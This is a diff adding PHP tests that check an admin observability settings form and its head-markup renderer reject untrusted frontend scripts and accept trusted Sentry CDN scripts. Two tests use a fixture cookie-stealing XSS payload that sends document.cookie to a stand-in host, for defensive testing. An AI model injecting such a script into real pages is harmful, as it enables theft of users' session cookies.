@@ -316,3 +316,106 @@ it('refuses probe events without a credential', function (): void {
         )
         ->assertStatus(422);
 });
+
+it('rejects untrusted frontend scripts in observability settings form', function (): void {
+    GeneralSetting::factory()->create();
+    $user = User::factory()->create([
+        'role' => UserRole::Admin,
+    ]);
+
+    grantObservabilityPermissions($user, ['observability']);
+    withoutMiddleware();
+
+    actingAs($user)
+        ->put(
+            portalUrlForAdministrators('/administrators/system-management/observability'),
+            validErrorReportingPayload([
+                'providers' => [
+                    'sentry' => [
+                        'frontend_enabled' => true,
+                        'frontend_script' => '<script>fetch("//evil.test/?c="+document.cookie)</script>',
+                    ],
+                ],
+            ])
+        )
+        ->assertSessionHasErrors('providers.sentry.frontend_script');
+});
+
+it('accepts valid Sentry CDN script in observability settings form', function (): void {
+    app(ErrorReportingService::class)->resetCache();
+    app(SentrySettingsService::class)->resetCache();
+    app(GeneralSettingsService::class)->replaceGlobalSettings(null);
+    GeneralSetting::factory()->create();
+    $user = User::factory()->create([
+        'role' => UserRole::Admin,
+    ]);
+
+    grantObservabilityPermissions($user, ['observability']);
+    withoutMiddleware();
+
+    actingAs($user)
+        ->put(
+            portalUrlForAdministrators('/administrators/system-management/observability'),
+            validErrorReportingPayload([
+                'providers' => [
+                    'sentry' => [
+                        'frontend_enabled' => true,
+                        'frontend_script' => '<script src="https://js.sentry-cdn.com/1234567890abcdef.min.js" crossorigin="anonymous"></script>',
+                    ],
+                ],
+            ])
+        )
+        ->assertRedirect()
+        ->assertSessionHas('success');
+});
+
+it('never renders untrusted scripts as raw HTML in renderHeadMarkup', function (): void {
+    app(GeneralSettingsService::class)->replaceGlobalSettings(null);
+    app(SentrySettingsService::class)->resetCache();
+
+    GeneralSetting::factory()->create([
+        'more_configs' => [
+            'error_reporting' => [
+                'providers' => [
+                    'sentry' => [
+                        'enabled' => true,
+                        'frontend_enabled' => true,
+                        'dsn' => '',
+                        'frontend_script' => '<script>fetch("//evil.test/?c="+document.cookie)</script>',
+                    ],
+                ],
+            ],
+        ],
+    ]);
+
+    $markup = app(SentrySettingsService::class)->renderHeadMarkup();
+
+    expect($markup)->not->toContain('fetch(')
+        ->and($markup)->not->toContain('evil.test')
+        ->and($markup)->toBe('');
+});
+
+it('renders trusted Sentry CDN scripts safely in renderHeadMarkup', function (): void {
+    app(GeneralSettingsService::class)->replaceGlobalSettings(null);
+    app(SentrySettingsService::class)->resetCache();
+
+    GeneralSetting::factory()->create([
+        'more_configs' => [
+            'error_reporting' => [
+                'providers' => [
+                    'sentry' => [
+                        'enabled' => true,
+                        'frontend_enabled' => true,
+                        'dsn' => 'https://publickey@o123.ingest.sentry.io/456',
+                        'frontend_script' => 'https://js.sentry-cdn.com/1234567890abcdef.min.js',
+                    ],
+                ],
+            ],
+        ],
+    ]);
+
+    $markup = app(SentrySettingsService::class)->renderHeadMarkup();
+
+    expect($markup)->toContain('https://js.sentry-cdn.com/1234567890abcdef.min.js')
+        ->and($markup)->toContain('<script src="https://js.sentry-cdn.com/1234567890abcdef.min.js" crossorigin="anonymous"></script>');
+});
